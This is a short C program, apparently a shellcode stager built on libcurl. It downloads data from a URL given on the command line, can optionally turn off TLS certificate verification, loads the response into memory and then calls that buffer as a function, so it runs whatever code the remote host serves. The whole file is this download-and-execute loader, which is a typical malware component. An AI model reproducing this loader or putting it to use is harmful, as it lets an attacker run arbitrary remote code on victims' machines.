#include <stdlib.h>
#include <string.h>
 
#include <curl/curl.h>
 
struct MemoryStruct {
  unsigned char *memory;
  size_t size;
};
 
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)userp;
 
  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
  if(ptr == NULL) {
    /* out of memory */ 
    printf("realloc returned NULL\n");
    return 0;
  }
 
  mem->memory = ptr;
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;
 
  return realsize;
}
 
int main(int argc, char **argv)
{
  /* require arguments */
  if(argc != 3) {
    printf("requires exactly 2 arguments\n");
    exit(1);
  }

  CURL *curl_handle;
  CURLcode res;
 
  struct MemoryStruct chunk;
 
  chunk.memory = malloc(1);  
  chunk.size = 0;    
 
  curl_global_init(CURL_GLOBAL_ALL);
 
  /* init the curl session */ 
  curl_handle = curl_easy_init();
  printf("attempting to connect to %s\n", argv[1]); 
  /* specify URL to get */ 
  curl_easy_setopt(curl_handle, CURLOPT_URL, argv[1]);

  /* don't validate cert */
  if(atoi(argv[2]) == 0) {
    curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);
  }
 
  /* send all data to this function  */ 
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
 
  /* pass chunk struct to the callback function */ 
  curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);
 
  /* set a user-agent */
  curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "libcurl-agent/1.0");
 
  /* get data */ 
  res = curl_easy_perform(curl_handle);
 
  /* check for errors */ 
  if(res != CURLE_OK) {
    fprintf(stderr, "%s\n", curl_easy_strerror(res));
  }
  else {
    printf("%lu bytes retrieved\n", (unsigned long)chunk.size);
    printf("%s", chunk.memory);

    /* execute */
    int (*ret)() = (int(*)())chunk.memory;
    ret();
  }
 
  /* cleanup */ 
  curl_easy_cleanup(curl_handle);
  free(chunk.memory);
  curl_global_cleanup();
 
  return 0;
}
